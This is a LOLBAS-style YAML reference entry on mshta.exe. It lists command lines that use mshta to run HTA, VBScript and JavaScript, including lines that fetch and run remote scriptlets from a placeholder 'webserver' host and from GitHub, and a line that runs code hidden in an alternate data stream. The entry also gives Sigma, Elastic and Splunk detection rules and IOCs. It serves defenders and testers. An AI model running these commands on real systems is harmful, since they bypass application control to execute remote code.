---
Name: Mshta.exe
Description: Used by Windows to execute html applications. (.hta)
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: mshta.exe evilfile.hta
    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
    Description: Executes VBScript supplied as a command line argument.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
    Description: Executes JavaScript supplied as a command line argument.
    Usecase: Execute code
    Category: Execute
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: mshta.exe "C:\ads\file.txt:file.hta"
    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
    Usecase: Execute code hidden in alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1218.005
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
Full_Path:
  - Path: C:\Windows\System32\mshta.exe
  - Path: C:\Windows\SysWOW64\mshta.exe
Code_Sample:
  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/05c58b4892942c34bfa01e9ada88ef2663858e1c/rules/windows/process_creation/win_susp_mshta_pattern.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_invoke_obfuscation_via_use_mhsta.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_lethalhta.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/f4ac416ef44862930730f8b7f16362b0e987bc71/rules/windows/process_creation/win_shell_spawn_mshta.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_mshta_javascript.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/file_event/sysmon_susp_clr_logs.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/image_load/sysmon_susp_script_dotnet_clr_dll_load.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
  - Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
  - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
  - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - IOC: mshta.exe executing raw or obfuscated script within the command-line
  - IOC: General usage of HTA file
  - IOC: msthta.exe network connection to Internet/WWW resource
  - IOC: DotNet CLR libraries loaded into mshta.exe
  - IOC: DotNet CLR Usage Log - mshta.exe.log
Resources:
  - Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
  - Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
